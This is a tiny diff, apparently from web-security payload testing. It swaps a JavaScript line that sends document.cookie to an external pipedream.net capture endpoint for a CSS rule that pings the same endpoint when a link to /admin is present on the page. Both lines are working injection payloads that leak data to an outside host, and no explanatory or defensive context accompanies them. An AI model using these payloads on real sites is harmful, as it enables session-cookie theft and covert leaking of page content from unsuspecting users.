@@ -1,2 +1,3 @@
-// v2
-window.location='https://eonx1tvsx1uwahp.m.pipedream.net/?c='+document.cookie;
+a[href^="/admin"] {
+    background: url('https://eonx1tvsx1uwahp.m.pipedream.net/found-admin-link');
+}
